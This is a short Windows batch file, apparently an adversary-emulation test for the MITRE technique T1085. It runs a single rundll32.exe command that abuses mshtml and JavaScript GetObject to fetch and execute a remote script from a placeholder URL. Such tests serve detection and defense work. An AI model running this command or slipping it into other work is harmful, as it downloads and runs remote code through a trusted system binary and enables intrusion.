@ECHO OFF

ECHO ===========================================================================
ECHO RunDLL32 - T1085
ECHO Rundll32 execute JavaScript Remote Payload With GetObject

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
